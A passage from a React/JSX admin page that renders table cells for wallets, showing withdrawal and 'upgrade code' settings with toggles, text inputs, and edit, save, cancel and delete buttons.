                                <span className="text-purple-400 text-xs font-mono">{wallet.withdrawalCode}</span>
                              )}
                            </div>
                          )}
                        </td>
                        {/* Upgrade Code Toggle + Code */}
                        <td className="p-4">
                          {editingWallet?.id === wallet.id ? (
                            <div className="space-y-2">
                              <label className="flex items-center gap-2 cursor-pointer">
                                <input
                                  type="checkbox"
                                  checked={requireUpgradeCodeInput}
                                  onChange={(e) => setRequireUpgradeCodeInput(e.target.checked)}
                                  className="w-4 h-4 bg-black border border-purple-500/30 rounded text-purple-600 focus:ring-2 focus:ring-purple-500"
                                />
                                <span className="text-gray-400 text-xs">Require</span>
                              </label>
                              {requireUpgradeCodeInput && (
                                <input
                                  type="text"
                                  value={upgradeCodeInput}
                                  onChange={(e) => setUpgradeCodeInput(e.target.value)}
                                  className="w-28 px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                                  placeholder="Code"
                                />
                              )}
                            </div>
                          ) : (
                            <div className="flex flex-col gap-1">
                              <span
                                className={`inline-flex px-2 py-1 rounded-full text-xs ${
                                  wallet.requireUpgradeCode
                                    ? "bg-amber-900/30 text-amber-400"
                                    : "bg-gray-900/30 text-gray-400"
                                }`}
                              >
                                {wallet.requireUpgradeCode ? "On" : "Off"}
                              </span>
                              {wallet.requireUpgradeCode && wallet.upgradeCode && (
                                <span className="text-purple-400 text-xs font-mono">{wallet.upgradeCode}</span>
                              )}
                            </div>
                          )}
                        </td>
                        <td className="p-4">
                          <div className="flex gap-2">
                            {editingWallet?.id === wallet.id ? (
                              <>
                                <button
                                  onClick={handleSaveBalance}
                                  className="p-2 bg-purple-900/30 border border-purple-500/30 rounded-lg hover:bg-purple-900/50 transition-colors"
                                  title="Save"
                                >
                                  <Save className="w-4 h-4 text-purple-400" />
                                </button>
                                <button
                                  onClick={handleCancelEdit}
                                  className="p-2 bg-gray-900/30 border border-gray-500/30 rounded-lg hover:bg-gray-900/50 transition-colors"
                                  title="Cancel"
                                >
                                  <X className="w-4 h-4 text-gray-400" />
                                </button>
                              </>
                            ) : (
                              <>
                                <button
                                  onClick={() => handleEditBalance(wallet)}
                                  className="p-2 bg-purple-900/30 border border-purple-500/30 rounded-lg hover:bg-purple-900/50 transition-colors"
                                  title="Edit"
                                >
                                  <Edit2 className="w-4 h-4 text-purple-400" />
                                </button>
                                <button
                                  onClick={() => handleDeleteWallet(wallet.id)}
                                  className="p-2 bg-red-900/30 border border-red-500/30 rounded-lg hover:bg-red-900/50 transition-colors"
                                  title="Delete"
                                >
                                  <Trash2 className="w-4 h-4 text-red-400" />
                                </button>
                              </>
                            )}
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        </div>
      </main>
    </div>
  )
}
